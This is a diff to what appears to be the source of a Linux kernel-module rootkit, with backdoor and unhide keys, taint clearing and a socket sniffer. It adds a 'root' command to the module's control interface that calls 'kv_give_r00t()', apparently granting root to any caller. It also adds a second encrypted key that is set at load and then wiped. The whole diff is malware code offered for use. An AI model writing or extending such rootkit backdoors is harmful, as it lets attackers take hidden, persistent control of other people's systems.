@@ -59,9 +59,11 @@ struct __lkmmod_t {
 static DEFINE_MUTEX(prc_mtx);
 static DEFINE_SPINLOCK(msguser_spin);
 static struct kv_crypto_st *kvmgc_unhidekey;
+struct kv_crypto_st *kvmgc_prckey;
 
 // Makefile auto-generated - DO NOT EDIT
 uint64_t auto_unhidekey = 0x0000000000000000;
+uint64_t auto_prckey = 0x0000000000000000;
 
 extern uint64_t auto_bdkey;
 
@@ -530,6 +532,7 @@ enum {
 	Opt_taint_clear,
 	Opt_output_enable,
 	Opt_output_disable,
+	Opt_root,
 
 #ifdef DEBUG_RING_BUFFER
 	// debug
@@ -565,6 +568,7 @@ static const match_table_t tokens = {
 	{ Opt_taint_clear, "taint-clear" },
 	{ Opt_output_enable, "output-enable" },
 	{ Opt_output_disable, "output-disable" },
+	{ Opt_root, "root" },
 #ifdef DEBUG_RING_BUFFER
 	{ Opt_get_bdkey, "get-bdkey" },
 	{ Opt_get_unhidekey, "get-unhidekey" },
@@ -797,6 +801,10 @@ static ssize_t write_cb(struct file *fptr, const char __user *user, size_t size,
 		case Opt_output_disable:
 			_msguser_toggle(false);
 			break;
+		case Opt_root:
+			rc = kv_give_r00t();
+			_set_msguser(&rc, MSG_INT);
+			break;
 		default:
 			break;
 		}
@@ -1025,6 +1033,16 @@ static int __init kv_init(void)
 	memcpy(buf, &auto_unhidekey, 8);
 	kv_encrypt(kvmgc_unhidekey, buf, sizeof(buf));
 	auto_unhidekey = 0;
+
+	if (!(kvmgc_prckey = kv_crypto_mgc_init())) {
+		prerr("Failed to initialize prckey encryption\n");
+		kv_crypto_engine_deinit();
+		goto crypto_error;
+	}
+
+	memcpy(buf, &auto_prckey, sizeof(auto_prckey));
+	kv_encrypt(kvmgc_prckey, buf, CRYPTO_KEY_LEN);
+	auto_prckey = 0;
 
 	tsk_sniff = kv_sock_start_sniff();
 	if (!tsk_sniff)
